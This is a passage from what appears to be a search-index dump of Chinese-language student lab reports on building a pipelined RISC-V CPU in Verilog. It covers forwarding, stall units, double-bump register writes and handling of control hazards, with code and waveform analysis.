jal_addr = EX_MEM_pc + EX_MEM_imm;\nassign jalr_addr = EX_MEM_alu_result;\n\nMuxPC mux_pc (\n    .I0(pc + 4),\n    .I1(jalr_addr),\n    .I2(jal_addr),\n    .I3(jal_addr),\n    .s(EX_MEM_pc_src),\n    .branch(EX_MEM_branch),\n    .b_type(EX_MEM_b_type),\n    .alu_res(EX_MEM_alu_result),\n    .o(pc_next)\n);\n</code></pre> \u8fd9\u6837\u6574\u4e2a\u6d41\u6c34\u7ebf CPU \u5c31\u5b8c\u6210\u4e86\u3002\u5b8c\u6574\u4ee3\u7801\u89c1\u9644\u4ef6\u3002</p>"},{"location":"cs/system/cs2/lab1/#_9","title":"\u4eff\u771f\u6d4b\u8bd5","text":"<p>\u56e0\u4e3a\u5728 lab0 \u4e2d\u5df2\u7ecf\u5b8c\u6210\u4e86 bonus \u6307\u4ee4\uff0c\u5305\u542b\u4e86\u672c\u5b9e\u9a8c\u4e2d\u7684\u6240\u6709\u6307\u4ee4\uff0c\u6240\u4ee5\u76f4\u63a5\u8f7d\u5165 coe \u6587\u4ef6\u8fd0\u884c\u5373\u53ef\uff0c\u4eff\u771f\u6ce2\u5f62\u5982\u4e0b\uff1a  </p>"},{"location":"cs/system/cs2/lab1/#_10","title":"\u6ce2\u5f62\u5206\u6790","text":"<p>\u7b2c\u4e00\u90e8\u5206\uff0c\u6b63\u5e38\u8fd0\u884c\u4e86\u4e00\u4e9b\u8ba1\u7b97\u6307\u4ee4\uff0c\u7ed3\u679c\u5747\u6b63\u786e\u3002\u5e76\u4e14\u51e0\u4e2a bne \u8df3\u8f6c\u672a\u8fbe\u5230\u6761\u4ef6\u6ca1\u6709\u8df3\u8f6c\u3002 </p> <p>\u7b2c\u4e8c\u90e8\u5206\uff0c\u4e3b\u8981\u662f\u8df3\u8f6c\uff0cslli \u6307\u4ee4\u540e\u9762\u63a5\u4e09\u4e2a nop\uff0c\u7136\u540e\u662f jalr \u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\uff0c\u5176\u4e2d MEM \u9636\u6bb5\u540e\u66f4\u6539\u4e86 pc\uff0cWB \u9636\u6bb5\u540e\u5c06\u8be5\u6307\u4ee4 pc \u52a0 4 \u540e\u5b58\u5165\u4e86 x1 \u5bc4\u5b58\u5668\u4e2d\u3002\u7136\u540e\u662f\u4e00\u4e9b nop \u6307\u4ee4\u9632\u6b62\u526f\u4f5c\u7528\uff08\u6b64\u5904\u53ea\u6267\u884c\u4e86\u4e09\u4e2a\uff09\uff0cpc \u8df3\u8f6c\u5230\u4e86 244\uff08\u5373 addi \u6307\u4ee4\u7684\u4f4d\u7f6e\uff09\uff0c\u6267\u884c\u4e86 addi \u6307\u4ee4\u540e\u6709\u4e09\u4e2a nop\uff0c\u4e00\u4e2a\u672a\u6210\u529f bne\uff0c\u4e94\u4e2a nop\uff0c\u4e4b\u540e\u8fd0\u884c\u5230\u4e86 j pass \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u53cd\u590d\u8df3\u5230\u5f53\u524d\u4f4d\u7f6e\uff0c\u5728\u4e0b\u56fe\u4e2d\u4e5f\u80fd\u6e05\u6670\u5730\u770b\u5230\u6709 pc \u8df3\u8f6c\u63a5 3 \u4e2a nop \u7684\u5faa\u73af\uff1a </p> <p>\u901a\u8fc7\u4ee5\u4e0a\u5206\u6790\uff0c\u53ef\u89c1\u8fd0\u884c\u662f\u6b63\u786e\u7684\u3002</p>"},{"location":"cs/system/cs2/lab1/#_11","title":"\u4e0a\u677f\u9a8c\u8bc1","text":"<p>\u9700\u8981\u4fee\u6539\u4e00\u4e2a\u5730\u65b9\u7528\u6765 debug\uff0c\u5373\u5c06 SCPU \u7684 debug_reg_addr \u8f93\u5165\u5230 Regs \u4e2d\uff0c\u7136\u540e\u8f93\u51fa debug_reg\uff0c\u4f20\u5165\u4e0a\u7ea7 Core \u4e2d\uff0c\u6765\u67e5\u770b\u67d0\u4e00\u5bc4\u5b58\u5668\u7684\u503c\u3002 <pre><code>Regs regs (\n    ...\n    .debug_reg_addr(debug_reg_addr),\n    .debug_reg(debug_reg)\n)\n</code></pre></p> <p>\u5176\u5b83\u529f\u80fd\uff08\u770b pc\u3001addr_out\u3001inst\uff0c\u4ee5\u53ca\u6839\u636e\u5f00\u5173\u8bbe\u7f6e debug_reg_addr\uff09\u5df2\u7ecf\u5728 lab0 \u4e2d\u5b9e\u73b0\uff0c\u8fd9\u91cc\u4fdd\u7559\u5373\u53ef\u3002</p> <p>\u4e0a\u677f\u540e\u9010\u5468\u671f\u8c03\u8bd5\u8fd0\u884c\uff0c\u5747\u548c\u6ce2\u5f62\u4e00\u81f4\uff0c\u7ed3\u679c\u6b63\u786e\u3002</p>"},{"location":"cs/system/cs2/lab1/#_12","title":"\u601d\u8003\u9898","text":"<ol> <li>\u5728\u4f60\u7684\u8bbe\u8ba1\u4e2d\uff0c\u672c\u5b9e\u9a8c\u6d4b\u8bd5\u6587\u4ef6\u4e2d\u7684 nop \u6570\u91cf\u662f\u5426\u591a\u4e8e\u6bcf\u6761\u6307\u4ee4\u6240\u9700\u7684\u5ef6\u8fdf\u5468\u671f\u6570\uff1f</li> </ol>   \u591a\u4e8e\u4e86\uff0c\u5bf9\u4e8e\u6211\u7684\u8bbe\u8ba1\u6765\u8bf4\uff0c\u5728\u6bcf\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762\u53ea\u9700\u8981\u63a5 3 \u4e2a nop \u6307\u4ee4\u5c31\u53ef\u4ee5\u9632\u6b62\u5176\u540e\u7684\u6307\u4ee4\u5728\u8df3\u8f6c\u524d\u88ab\u6267\u884c\uff08\u8be6\u89c1\u4e0a\u9762\u6ce2\u5f62\u5206\u6790\uff09\uff0c\u4f46\u662f\u5728\u6d4b\u8bd5\u6587\u4ef6\u4e2d\uff0c\u6bcf\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762\u90fd\u63a5\u4e86 5 \u4e2a nop \u6307\u4ee4\uff0c\u8fd9\u6837\u5c31\u591a\u4e86 2 \u4e2a\u5ef6\u8fdf\u5468\u671f\u3002   <ol> <li>\u53c8\u662f\u5426\u5b58\u5728\u51fa\u73b0\u51b2\u7a81\u4f46\u662f\u6ca1\u6709\u7ed9\u8db3 nop \u7684\u60c5\u51b5\uff1f</li> </ol>   \u4e0d\u5b58\u5728   <ol> <li>\u8bf7\u8ba1\u7b97\u6bcf\u6761\u6307\u4ee4\u95f4\u5b9e\u9645\u6240\u9700\u8981\u7684 nop \u6570\u91cf\uff0c\u5e76\u5bf9\u4f60\u7684 coe \u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u4e4b\u6b63\u786e\u5730\u8fd0\u884c\u51fa\u76f8\u5e94\u7684\u7ed3\u679c</li> </ol>   \u9700\u8981\u4fee\u6539\u7684\u53ea\u662f\u5404\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762 nop \u7684\u4e2a\u6570\uff0c\u4ece 5 \u4e2a\u4fee\u6539\u5230 3 \u4e2a\uff0c\u5176\u4ed6\u6307\u4ee4\u4e0d\u9700\u8981\u4fee\u6539\u3002\u4ecd\u53ef\u4ee5\u6b63\u786e\u8fd0\u884c\u3002"},{"location":"cs/system/cs2/lab2/","title":"\u6d41\u6c34\u7ebf\u5192\u9669\u5904\u7406","text":"<p> \u7ea6 2732 \u4e2a\u5b57  300 \u884c\u4ee3\u7801  15 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab2 \u5b9e\u9a8c\u62a5\u544a\uff082022.10.08 ~ 2022.10.27\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs2/lab2/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9\u6570\u636e\u5192\u9669","text":"<ul> <li>lab 2-1\uff1a\u6682\u505c\u4e0e\u5192\u9669<ul> <li>\u5728 lab 1 \u7684\u57fa\u7840\u4e0a\u52a0\u5165 stall \u673a\u5236\u5904\u7406\u6570\u636e\u5192\u9669\u548c\u63a7\u5236\u5192\u9669</li> <li>\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u57fa\u672c\u529f\u80fd</li> <li>\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u8bbe\u8ba1\u89c4\u8303</li> <li>\u601d\u8003\u9898<ol> <li>\u8bf7\u4f60\u5bf9\u6570\u636e\u51b2\u7a81\u60c5\u51b5\u8fdb\u884c\u5206\u6790\u5f52\u7eb3\uff0c\u8bd5\u7740\u5c06\u4ed6\u4eec\u5206\u7c7b\u5217\u51fa\u3002</li> <li>\u5982\u679c EX, MEM, WB \u6bb5\u4e2d\u4e0d\u6b62\u4e00\u4e2a\u6bb5\u7684\u5199\u5bc4\u5b58\u5668\u4e0e ID \u6bb5\u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u8be5\u5982\u4f55\u5904\u7406\uff1f</li> </ol> </li> </ul> </li> <li>lab 2-2\uff1a\u65c1\u8def\u4f18\u5316 Forwarding<ul> <li>\u5728 lab 2-1 \u57fa\u7840\u4e0a\u5b9e\u73b0 Forwarding \u673a\u5236</li> <li>\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u548c\u4e0a\u677f\u6d4b\u8bd5</li> <li>\u601d\u8003\u9898<ol> <li>\u5728\u5f15\u5165 Forwarding \u673a\u5236\u540e\uff0c\u662f\u5426\u610f\u5473\u7740 stall \u673a\u5236\u5c31\u4e0d\u518d\u9700\u8981\u4e86\uff1f\u4e3a\u4ec0\u4e48\uff1f</li> <li>\u4f60\u8ba4\u4e3a Forwarding \u673a\u5236\u5728\u5b9e\u9645\u7684\u7535\u8def\u8bbe\u8ba1\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u5b9a\u7684\u5f0a\u7aef\uff1f\u5982\u679c\u5b58\u5728\uff0c\u8bf7\u7ed9\u51fa\u4f60\u7684\u7406\u7531\u3002</li> </ol> </li> </ul> </li> </ul> <p>\u672c\u62a5\u544a\u6ca1\u6709\u6309\u7167\u4e24\u4e2a lab \u7684\u987a\u5e8f\u8fdb\u884c\uff0c\u800c\u662f\u4ee5\u5177\u4f53\u8fdb\u884c\u4fee\u6539\u7684\u987a\u5e8f\u8fdb\u884c\u7684\uff08\u5148\u5904\u7406\u6570\u636e\u5192\u9669\uff0c\u7136\u540e\u5904\u7406\u63a7\u5236\u5192\u9669\uff0c\u6700\u540e\u5904\u7406\u5728\u5b9e\u9645\u8fd0\u884c\u65f6\u9047\u5230\u7684\u5176\u5b83\u5192\u9669\u95ee\u9898\uff09\u3002</p>"},{"location":"cs/system/cs2/lab2/#forwarding","title":"Forwarding \u673a\u5236","text":"<p>\u548c\u4e0a\u8bfe/\u4e66\u4e0a\u8bb2\u7684\u4e00\u6837\uff0c\u901a\u8fc7\u4e00\u4e2a ForwardingUnit \u6765\u8ba1\u7b97\u662f\u5426\u9700\u8981\u524d\u9012\uff0c\u7136\u540e\u901a\u8fc7\u591a\u8def\u9009\u62e9\u5668\u9009\u62e9\u51fa\u4f20\u5165 ALU \u7684\u7ed3\u679c\u3002</p> <p>\u5728\u6b64\u57fa\u7840\u4e0a\u9700\u8981\u4e00\u4e9b\u6539\u8fdb\u7684\u662f\uff0c\u5728\u6211\u7684 CPU \u4e2d\uff0cALU \u7684\u4e24\u4e2a\u8f93\u5165\u90fd\u5df2\u7ecf\u9700\u8981\u5148\u9009\u62e9\uff08\u4e00\u4e2a\u901a\u8fc7 auipc \u9009\u62e9 PC \u8fd8\u662f\u5bc4\u5b58\u5668\u503c\uff0c\u4e00\u4e2a\u901a\u8fc7 alu_src \u9009\u62e9\u5bc4\u5b58\u5668\u503c\u8fd8\u662f\u7acb\u5373\u6570\uff09\uff0c\u6240\u4ee5 ForwardingUnit \u8fd8\u9700\u8981\u63a5\u6536 auipc\u3001alu_src \u4e24\u4e2a\u4fe1\u53f7\uff0c\u5982\u679c auipc \u4e3a 1 \u5219\u8be5\u4fa7\u4e0d\u4f1a\u4f7f\u7528\u5bc4\u5b58\u5668\u503c\uff0c\u4e5f\u5c31\u4e0d\u6d89\u53ca\u5230\u6570\u636e\u5192\u9669\uff0calu_src \u4e5f\u540c\u7406\u3002\u8fd9\u6837\u8f93\u51fa\u7684\u503c\u6709\u56db\u79cd\u60c5\u51b5\uff0c\u5177\u4f53\u89c1\u4e0b\u9762\u4ee3\u7801\u6ce8\u91ca\uff1a <pre><code>module ForwardingUnit(\n    input       [4:0]   EX_MEM_rd,\n    input       [4:0]   MEM_WB_rd,\n    input       [4:0]   ID_EX_rs1,\n    input       [4:0]   ID_EX_rs2,\n    input               EX_MEM_reg_write,\n    input               MEM_WB_reg_write,\n    input               auipc,\n    input               alu_src_b,\n    output reg  [1:0]   ForwardA,   // 00 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c01 \u6765\u81ea EX/MEM\uff0c10 \u6765\u81ea MEM/WB\uff0c11 \u6765\u81ea PC\n    output reg  [1:0]   ForwardB    // 00 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c01 \u6765\u81ea EX/MEM\uff0c10 \u6765\u81ea MEM/WB\uff0c11 \u6765\u81ea imm\n);\n    always @(*) begin\n        if (auipc) assign ForwardA = 2'b11;\n        else begin\n            if (EX_MEM_reg_write == 1 &amp;&amp; EX_MEM_rd != 0 &amp;&amp; EX_MEM_rd == ID_EX_rs1) assign ForwardA = 2'b01;\n            else if (MEM_WB_reg_write == 1 &amp;&amp; MEM_WB_rd != 0 &amp;&amp; MEM_WB_rd == ID_EX_rs1) assign ForwardA = 2'b10;\n            else assign ForwardA = 2'b00; \n        end\n        if (alu_src_b) assign ForwardB = 2'b11;\n        else begin\n            if (EX_MEM_reg_write == 1 &amp;&amp; EX_MEM_rd != 0 &amp;&amp; EX_MEM_rd == ID_EX_rs2) assign ForwardB = 2'b01;\n            else if (MEM_WB_reg_write == 1 &amp;&amp; MEM_WB_rd != 0 &amp;&amp; MEM_WB_rd == ID_EX_rs2) assign ForwardB = 2'b10;\n            else assign ForwardB = 2'b00;\n        end\n    end\nendmodule\n</code></pre> \u6b64\u5916\u9700\u8981\u4e00\u4e9b wire \u548c reg\uff1a <pre><code>    wire    [2:0]   forwardA, forwardB;\n    reg     [4:0]   ID_EX_rs1, ID_EX_rs2;\n\n// \u65f6\u5e8f\u66f4\u65b0\uff1a\n    ID_EX_rs1 &lt;= IF_ID_inst[19:15];\n    ID_EX_rs2 &lt;= IF_ID_inst[24:20];\n</code></pre> \u4ee5\u53ca\u6700\u540e\u8fde\u7ebf\u9009\u62e9 ALU \u8f93\u5165\uff1a <pre><code>ForwardingUnit forwarding (\n    .EX_MEM_rd(EX_MEM_write_addr),\n    .MEM_WB_rd(MEM_WB_write_addr),\n    .ID_EX_rs1(ID_EX_rs1),\n    .ID_EX_rs2(ID_EX_rs2),\n    .EX_MEM_reg_write(EX_MEM_reg_write),\n    .MEM_WB_reg_write(MEM_WB_reg_write),\n    .auipc(ID_EX_auipc),\n    .alu_src_b(ID_EX_alu_src),\n    .ForwardA(forwardA),\n    .ForwardB(forwardB),\n);\n\nMux4x32 mux_alu_a (\n    .I0(ID_EX_data1),\n    .I1(EX_MEM_alu_result),\n    .I2(write_data),   // WB \u6bb5\u9009\u62e9\u51fa\u6765\u7684\u5199\u56de\u5bc4\u5b58\u5668\u7684\u6570\u636e\n    .I3(ID_EX_pc),\n    .s(forwardA),\n    .o(alu_data1)\n);\n\nMux4x32 mux_alu_b (\n    .I0(ID_EX_data2),\n    .I1(EX_MEM_alu_result),\n    .I2(write_data),\n    .I3(ID_EX_imm),\n    .s(forwardB),\n    .o(alu_data2)\n);\n</code></pre></p>"},{"location":"cs/system/cs2/lab2/#double-bump","title":"Double bump \u673a\u5236","text":"<p>\u6839\u636e\u6307\u5bfc\uff0c\u4e3a\u4e86\u89e3\u51b3\u540c\u4e00\u4e2a\u5468\u671f\u5185\u5199\u5165 reg \u540e\u8bfb\u7684\u5192\u9669\u60c5\u51b5\uff0c\u9700\u8981\u4f7f\u7528 double bump \u673a\u5236\u3002\u5728\u5bc4\u5b58\u5668\u7ec4\u7684\u5b9a\u4e49\u4e2d\uff0c\u8bfb\u53d6\u7684\u7ed3\u679c\u662f\u76f4\u63a5 assign \u7684\uff0c\u800c\u5199\u5165\u624d\u662f\u65f6\u5e8f\u903b\u8f91\uff0c\u6240\u4ee5\u53ea\u8981\u8ba9\u5bc4\u5b58\u5668\u7ec4\u5728 CPU \u7684\u4e00\u4e2a\u5468\u671f\u4e2d\u5b8c\u6210\u5199\u5165\u5373\u53ef\uff08\u800c\u4e0d\u662f\u5728\u4e0b\u4e00\u4e2a\u5468\u671f\u5f00\u59cb\u7684\u4e0a\u5347\u6cbf\u5199\u5165\uff09\u3002\u8fd9\u6837\u6765\u8bf4\u53ea\u8981\u5c06\u5bc4\u5b58\u5668\u7ec4\u7684\u5199\u5165\u89e6\u53d1\u6539\u4e3a\u4e0b\u964d\u6cbf\uff08negedge\uff09\u5373\u53ef\uff1a <pre><code>always @(negedge clk or posedge rst) begin\n    if (rst == 1) for (i = 1; i &lt; 32; i = i + 1) register[i] &lt;= 0; // reset\n    else if (we == 1 &amp;&amp; write_addr != 0) register[write_addr] &lt;= write_data;\nend\n</code></pre></p>"},{"location":"cs/system/cs2/lab2/#stall","title":"Stall \u673a\u5236","text":"<p>\u5bf9\u4e8e load-use \u7c7b\u6570\u636e\u5192\u9669\uff0c\u4ec5 forwarding \u662f\u4e0d\u591f\u7684\uff0c\u9700\u8981\u518d stall \u4e00\u4e2a\u5468\u671f\u624d\u53ef\u4ee5 forwarding\u3002 </p> <p>\u5982\u4e0a\u56fe\uff0c\u9700\u8981\u5728\u6bcf\u6761\u6307\u4ee4\u8fdb\u5165 ID \u9636\u6bb5\u540e\u8fdb\u884c\u9a8c\u8bc1\uff0c\u9a8c\u8bc1\u8fd9\u65f6\u5904\u4e8e EX \u9636\u6bb5\u7684\u6307\u4ee4\u662f\u4e0d\u662f load \u6307\u4ee4\uff08\u662f\u5426\u53d1\u751f\u4e86 D-Mem \u7684\u6570\u636e\u8bfb\u53d6\uff09\u7136\u540e\u68c0\u6d4b\u662f\u5426\u4e0e\u5f53\u524d\u6307\u4ee4\u6709\u6570\u636e\u51b2\u7a81\u3002\u5982\u679c\u6709\u51b2\u7a81\u5219\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f\uff0c\u5177\u4f53\u4e3a\uff1a</p> <ul> <li>EX/MEM \u4e0e MEM/WB \u9636\u6bb5\u4ecd\u6b63\u5e38\u6267\u884c\u6d41\u8f6c</li> <li>\u5c06\u5f53\u524d\u7684 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u4e2d\u63a7\u5236\u4fe1\u53f7\u7f6e 0\uff0c\u5373\u76f8\u5f53\u4e8e\u63d2\u5165 bubble</li> <li>\u963b\u6b62 IF/ID \u9636\u6bb5\u5bc4\u5b58\u5668\u548c PC \u7684\u65f6\u5e8f\u66f4\u65b0\uff0c\u5b9e\u73b0\u6682\u505c</li> </ul> <p>\u9996\u5148\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a mem_read \u63a7\u5236\u4fe1\u53f7\u6765\u5224\u65ad\u662f\u5426\u53d1\u751f\u4e86\u6570\u636e\u8bfb\u53d6\uff08\u4e0d\u53ef\u4ee5\u901a\u8fc7 mem_write \u5224\u65ad\uff0c\u56e0\u4e3a mem_write \u4e3a 0 \u53ef\u80fd\u4e5f\u4e0d\u4f1a\u4f7f\u7528\u8bfb\u53d6\u7684\u6570\u636e\uff09\uff1a <pre><code>module Control (\n    ...\n    output reg          mem_read\n);\n    `include \"AluOp.vh\"\n    always @(*) begin\n        ...\n        mem_read    = 0;\n        case (op_code)\n            7'b0000011: begin   // lw\n                ...\n                mem_read = 1;\n            end\n            ...   \n        endcase\n    end\nendmodule\n</code></pre> \u7136\u540e\u540c\u7406\u5728 CPU \u4e2d\u521b\u5efa wire mem_read \u7528\u4e8e\u63a5\u6536\u5f53\u524d Control \u7684\u8f93\u51fa\uff0c\u7136\u540e\u901a\u8fc7\u65f6\u5e8f\u8d4b\u503c\u7ed9 reg ID_EX_mem_read \u5bc4\u5b58\u5668\u3002\u4e4b\u540e\u9700\u8981\u4e00\u4e2a StallUnit \u6765\u5224\u65ad\u662f\u5426\u9700\u8981\u6682\u505c\uff1a <pre><code>module StallUnit(\n    input           ID_EX_mem_read,\n    input   [4:0]   ID_EX_rd,\n    input   [4:0]   IF_ID_rs1,\n    input   [4:0]   IF_ID_rs2,\n    output          bubble_stop\n);\n    assign bubble_stop = ID_EX_mem_read &amp;&amp; (ID_EX_rd == IF_ID_rs1 || ID_EX_rd == IF_ID_rs2);\nendmodule\n</code></pre> \u8fde\u63a5\uff1a <pre><code>wire bubble_stop;\nStallUnit stallunit (\n    .ID_EX_mem_read(ID_EX_mem_read),\n    .ID_EX_rd(ID_EX_write_addr),\n    .IF_ID_rs1(IF_ID_inst[19:15]),\n    .IF_ID_rs2(IF_ID_inst[24:20]),\n    .bubble_stop(bubble_stop)\n);\n</code></pre> \u7136\u540e\u5728\u65f6\u5e8f\u66f4\u65b0\u90e8\u5206\u5224\u65ad bubble_stop \u662f\u5426\u4e3a 1\uff0c\u5982\u679c\u4e3a 1 \u5219\u8fdb\u884c\u7279\u6b8a\u5904\u7406\uff08\u4e0d\u66f4\u65b0 pc \u548c IF/ID\uff0c\u4e3a ID/EX \u63a7\u5236\u4fe1\u53f7\u8d4b 0\uff09\uff1a <pre><code>always @(posedge clk or posedge rst) begin \n    if (rst) begin ... end\n    else begin\n        if (bubble_stop) begin\n            ID_EX_alu_op &lt;= 4'b0;          ID_EX_pc_src &lt;= 2'b0;\n            ID_EX_mem_to_reg &lt;= 2'b0;      ID_EX_reg_write &lt;= 1'b0;\n            ID_EX_alu_src &lt;= 1'b0;         ID_EX_branch &lt;= 1'b0;\n            ID_EX_b_type &lt;= 1'b0;          ID_EX_auipc &lt;= 1'b0;\n            ID_EX_mem_write &lt;= 1'b0;       ID_EX_mem_read &lt;= 1'b0;\n        end else begin\n            pc &lt;= pc_next;\n\n            IF_ID_pc &lt;= pc;                IF_ID_inst &lt;= inst;\n\n            ID_EX_pc_src &lt;= pc_src;        ID_EX_mem_to_reg &lt;= mem_to_reg;\n            ID_EX_reg_write &lt;= reg_write;  ID_EX_alu_src &lt;= alu_src;\n            ID_EX_branch &lt;= branch;        ID_EX_b_type &lt;= b_type;\n            ID_EX_auipc &lt;= auipc;          ID_EX_alu_op &lt;= alu_op;\n            ID_EX_mem_write &lt;= mem_write_; ID_EX_mem_read &lt;= mem_read;\n        end\n        // update of EX/MEM and MEM/WB\n    end\nend\n</code></pre></p>"},{"location":"cs/system/cs2/lab2/#_3","title":"\u6d4b\u8bd5","text":"<p>\u4ece\u7ed9\u51fa\u7684\u6c47\u7f16\u4e2d\u6311\u53d6\u4e86\u4e00\u5c0f\u90e8\u5206\u7528\u6765\u6d4b\u8bd5\u524d\u9762\u5904\u7406\u8fc7\u7684\u6570\u636e\u5192\u9669\uff1a <pre><code>addi x1, x0, 1  \naddi x2, x0, 1\naddi x4, x0, 5\nadd x3, x1, x2\nadd x1, x2, x3\nadd x2, x1, x3\nld x4, 0(x2)\naddi x4, x4, -1\n</code></pre> \u8f7d\u5165\u7ed9\u51fa\u7684\u521d\u59cb RAM\uff0c\u4eff\u771f\u6ce2\u5f62\u53ca\u5176\u5206\u6790\u5982\u4e0b\uff0c\u53ef\u89c1\u8ba1\u7b97\u7ed3\u679c\u5747\u6b63\u786e\uff0c\u6682\u505c\u4e5f\u7b26\u5408\u9884\u671f </p>"},{"location":"cs/system/cs2/lab2/#_4","title":"\u63a7\u5236\u5192\u9669","text":""},{"location":"cs/system/cs2/lab2/#_5","title":"\u5206\u652f\u5224\u65ad\u524d\u79fb","text":"<p>\u6309\u7167\u4e4b\u524d\u7684\u8bbe\u8ba1\uff0c\u5173\u4e8e\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\u7684 pc_next \u8ba1\u7b97\u662f\u5728 MEM \u6bb5\u5b8c\u6210\u7684\uff08\u5229\u7528\u4ece EX \u6bb5\u4f20\u51fa\u6765\u7684 alu_result\uff09\uff0c\u4f46\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5bf9\u4e8e\u6bcf\u4e00\u6761\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\u540e\u9762\u90fd\u9700\u8981\u7b49\u5f85\u4e09\u4e2a\u5468\u671f\u624d\u80fd\u5f97\u5230\u6b63\u786e pc\u3002\u800c\u5b9e\u9645\u4e0a\u5728 ID \u6bb5\u5c31\u53ef\u4ee5\u6839\u636e\u4ece\u5bc4\u5b58\u5668\u4e2d\u8bfb\u51fa\u6765\u7684\u7ed3\u679c\u5224\u65ad\u662f\u5426\u9700\u8981\u5206\u652f\u3002\u6240\u4ee5\u53ef\u4ee5\u5c06 MEM \u9636\u6bb5\u7684 pc mux \u79fb\u5230 ID \u6bb5\uff0c\u8fd9\u6837\u5c31\u53ea\u9700\u8981\u7b49\u5f85\u4e00\u4e2a\u5468\u671f\u3002</p> <p>\u8fd9\u6837\u7b49\u5f85\u4e00\u4e2a\u5468\u671f\u548c\u524d\u9762\u7684 stall \u5c31\u5f88\u76f8\u4f3c\u4e86\uff0c\u4f46\u662f\u8fd8\u6709\u4e00\u4e9b\u4e0d\u540c\uff0c\u524d\u9762\u6570\u636e\u5192\u9669\u7684 stall \u662f\u5c06\u5f53\u524d\u6307\u4ee4\u6682\u505c\uff0c\u5373\u53d8\u6210\u4e00\u4e2a bubble \u4f20\u4e0b\u53bb\u800c\u5f53\u524d\u6307\u4ee4\u7b49\u5f85\u3002\u800c\u6b64\u5904\u7684\u5f53\u524d\u6307\u4ee4\u662f branch \u6307\u4ee4\uff0c\u9700\u8981\u7ee7\u7eed\u4f20\u4e0b\u53bb\uff0c\u800c\u5728\u5176\u540e\u63d2\u5165\u4e00\u6761 bubble\uff0c\u6240\u4ee5\u5b9e\u9645\u7684\u64cd\u4f5c\u4e3a\uff1a</p> <ul> <li>pc \u53ef\u4ee5\u7ee7\u7eed\u66f4\u65b0\uff08\u4f46\u662f\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u662f\u8df3\u8f6c\u6307\u4ee4\uff0c\u5219\u5728\u9009\u62e9\u5f53\u524d pc_next \u65f6\u4e0d\u4f20\u5165 pc+4 \u800c\u662f pc\uff0c\u5373\u6682\u505c\u4e00\u6761\uff09</li> <li>IF/ID \u6bb5\u7684 pc \u53ef\u4ee5\u968f\u610f\uff0cinst \u8bbe\u7f6e\u4e3a 32'h00000013\uff0c\u5373 nop\uff08\u76f8\u5f53\u4e8e\u5728\u540e\u9762\u63d2\u5165\u4e86\u4e00\u6761 bubble\uff09</li> <li>\u5269\u4e0b\u7684\u90e8\u5206\u90fd\u6b63\u5e38\u66f4\u65b0\u6d41\u8f6c</li> </ul> <p>\u56e0\u6b64\u9996\u5148\u9700\u8981\u4e3a\u63a7\u5236\u6a21\u5757\u52a0\u4e00\u4e2a jump \u63a7\u5236\u4fe1\u53f7\u5224\u65ad\u662f\u5426\u662f\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\uff1a <pre><code>module Control (\n    ...\n    output reg          jump\n);\n    `include \"AluOp.vh\"\n    always @(*) begin\n        ...\n        jump        = 0;\n        case (op_code)\n            ...\n            7'b1100011: begin   // bne beq\n                ...     jump = 1;\n            end\n            7'b1101111: begin   // jal\n                ...     jump = 1;\n            end\n            7'b1100111: begin   // jalr\n                ...     jump = 1;\n            end\n            ...   \n        endcase\n    end\nendmodule\n</code></pre></p> <p>\u7136\u540e\u662f\u65b0\u589e wire jump \u7528\u6765\u4f20\u8f93\uff0c\u4ee5\u53ca\u9488\u5bf9\u4e8e jump \u60c5\u51b5 stall \u7684\u65f6\u5e8f\u66f4\u65b0\uff1a <pre><code>always @(posedge clk or posedge rst) begin \n    if (rst) begin ... end\n    else begin\n        if (bubble_stop) begin ... end \n        else if (jump) begin\n            pc &lt;= pc_next;\n\n            IF_ID_pc &lt;= pc;\n            IF_ID_inst &lt;= 32'h00000013;\n\n            ID_EX_pc_src &lt;= pc_src;\n            ID_EX_mem_to_reg &lt;= mem_to_reg;\n            ID_EX_reg_write &lt;= reg_write;\n            ID_EX_alu_src &lt;= alu_src;\n            ID_EX_branch &lt;= branch;\n            ID_EX_b_type &lt;= b_type;\n            ID_EX_auipc &lt;= auipc;\n            ID_EX_alu_op &lt;= alu_op;\n            ID_EX_mem_write &lt;= mem_write_;\n            ID_EX_mem_read &lt;= mem_read;\n        end else begin \n            ...\n</code></pre></p> <p>\u6700\u540e\u662f\u5728 ID \u9636\u6bb5\u7684 pc \u9009\u62e9\u5668\uff1a</p> <pre><code>assign jal_addr = IF_ID_pc + imm;\nassign jalr_addr = read_data1 + read_data2;\nMuxPC mux_pc (\n    .I0(jump ? pc : pc + 4),\n    .I1(jalr_addr),\n    .I2(jal_addr),\n    .I3(jal_addr),\n    .s(pc_src),\n    .branch(branch),\n    .b_type(b_type),\n    .alu_res(read_data1 ^ read_data2),\n    .o(pc_next)\n);\n</code></pre>"},{"location":"cs/system/cs2/lab2/#_6","title":"\u5904\u7406\u63a7\u5236\u5192\u9669\u4e2d\u7684\u6570\u636e\u5192\u9669","text":"<p>\u524d\u9762\u5c06 pc 